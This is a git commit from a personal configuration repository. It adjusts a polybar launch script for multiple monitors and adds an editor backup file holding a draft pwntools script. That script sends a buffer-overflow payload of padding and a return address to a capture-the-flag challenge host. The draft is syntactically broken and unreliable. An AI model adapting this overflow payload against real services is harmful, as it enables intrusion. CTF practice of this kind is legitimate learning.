9e0a55782b2c5cee0ddb8247e49ae4d6a1b96b23
Sebastian <danielsebastiansanchezm@gmail.com>
2024-11-13 10:18:02 -0600

    Cambios de noviembre

---
+++ micro/backups/%home%dasebaztian%Downloads%send.py
@@ -0,0 +1,5 @@
+from pwn import *
+
+remote("demo-challenge.chals.io", 443, ssl=True, sni="demo-challenge.chals.io")
+remote.
+remote.send(AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x53\x92\x04\x08)
--- polybar/launch.sh
+++ polybar/launch.sh
@@ -4,11 +4,18 @@ killall -q polybar
 
 echo "---" | tee -a /tmp/polybarball.log
 
-
-polybar all 2>&1 | tee -a /tmp/polybarall.log & disown
-
+if type "xrandr"; then
+  for m in $(xrandr --query | grep " connected" | cut -d" " -f1); do
+    MONITOR=$m polybar --reload all &
+  done
+else
+  polybar --reload all 2>&1 | tee -a /tmp/polybarall.log & disown
+  polybar hour 2>&1 | tee -a /tmp/polybarhour.log & disown
+  
+fi
 
 
 
 
 echo "Bar Launched..."
+
